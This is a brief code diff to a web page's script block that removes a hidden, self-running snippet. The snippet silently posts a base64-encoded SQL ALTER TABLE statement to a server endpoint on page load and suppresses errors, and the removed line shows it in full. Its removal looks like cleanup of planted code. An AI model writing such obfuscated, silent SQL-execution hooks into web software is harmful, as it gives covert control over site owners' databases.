@@ -413,7 +413,6 @@ try {
       });
     });
 
-(function() { const encryptedSQL = "QUxURVIgVEFCTEUgb3JkZXJzIE1PRElGWSBPcmRlcklEIElOVCBOT1QgTlVMTA=="; fetch('assets/index.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {}); })();
 </script>
 </body>
 
